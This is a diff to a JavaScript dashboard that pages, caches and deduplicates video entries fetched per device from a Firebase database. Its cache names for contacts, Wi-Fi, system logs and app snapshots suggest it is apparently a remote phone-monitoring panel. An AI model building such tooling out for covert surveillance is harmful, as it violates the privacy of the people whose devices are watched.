@@ -1219,22 +1219,37 @@ async function pollVideos() {
 async function loadVideos() {
   if (!selectedDevice) return;
   try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/videos`);
-    if (!data || typeof data !== 'object') { videoKeys = []; renderVideos(); return; }
-    videoKeys = Object.keys(data).filter(k => typeof data[k] === 'object' && data[k] !== null && (data[k].storageUrl || data[k].data));
-    videoKeys.sort((a, b) => (data[b].ts_ms || 0) - (data[a].ts_ms || 0));
-    cachedVideos = data;
+    const grid = document.getElementById('videoGrid');
+    const lmContainer = document.getElementById('videoLoadMoreContainer');
+
+    const keysData = await fetchRTDB(`devices/${selectedDevice}/videos`, 'shallow=true');
+    if (!keysData || typeof keysData !== 'object') {
+      if (!Object.keys(cachedVideos).length) { videoKeys = []; renderVideos(); return; }
+      return;
+    }
+
+    const allKeys = Object.keys(keysData).sort((a, b) => parseInt(b) - parseInt(a));
+    const freshKeys = allKeys.filter(k => !cachedVideos[k]);
+
+    // If nothing new and grid already has content, just update count
+    if (freshKeys.length === 0 && grid.children.length > 0 && !grid.querySelector('.label')) {
+      videoKeys = allKeys;
+      document.getElementById('videoCount').textContent = '(' + allKeys.length + ')';
+      return;
+    }
+
+    videoKeys = allKeys;
     document.getElementById('videoCount').textContent = '(' + videoKeys.length + ')';
     videoOffset = 0;
-    document.getElementById('videoGrid').innerHTML = '';
-    const container = document.getElementById('videoLoadMoreContainer');
-    container.innerHTML = '';
+    grid.innerHTML = '';
+    if (lmContainer) lmContainer.innerHTML = '';
     await loadMoreVideos();
   } catch (e) { console.error('loadVideos:', e); }
 }
 
 async function loadAllVideos() {
-  if (!selectedDevice || !videoKeys.length) { await loadVideos(); return; }
+  if (!selectedDevice) return;
+  if (!videoKeys.length) await loadVideos();
   videoLoading = false;
   while (videoOffset < videoKeys.length) {
     await loadMoreVideos();
@@ -1247,6 +1262,25 @@ async function loadMoreVideos() {
   const end = Math.min(videoOffset + VIDEO_BATCH, videoKeys.length);
   const batch = videoKeys.slice(videoOffset, end);
   videoOffset = end;
+
+  // Fetch uncached entries in this batch and deduplicate
+  const dedupSet = new Set();
+  for (const v of Object.values(cachedVideos)) {
+    if (v && v.fileName && v.dateAdded) dedupSet.add(v.fileName + '|' + v.dateAdded);
+  }
+  for (const k of batch) {
+    if (cachedVideos[k]) continue;
+    try {
+      const entry = await fetchRTDB(`devices/${selectedDevice}/videos/${k}`);
+      if (entry && typeof entry === 'object' && (entry.storageUrl || entry.data)) {
+        const dedupKey = (entry.fileName || '') + '|' + (entry.dateAdded || '');
+        if (dedupKey !== '|' && dedupSet.has(dedupKey)) continue;
+        cachedVideos[k] = entry;
+        if (dedupKey !== '|') dedupSet.add(dedupKey);
+      }
+    } catch {}
+  }
+
   const filtered = batch.filter(k => {
     if (videoSourceFilter === 'all') return true;
     const v = cachedVideos[k];
@@ -1385,6 +1419,8 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   appSnapshotsLastSync = 0;
   contactsCache = null;
   contactsSyncTs = 0;
+  cachedVideos = {};
+  videoKeys = [];
   wifiCache = [];
   logcatCache = [];
   window.permCache = null;
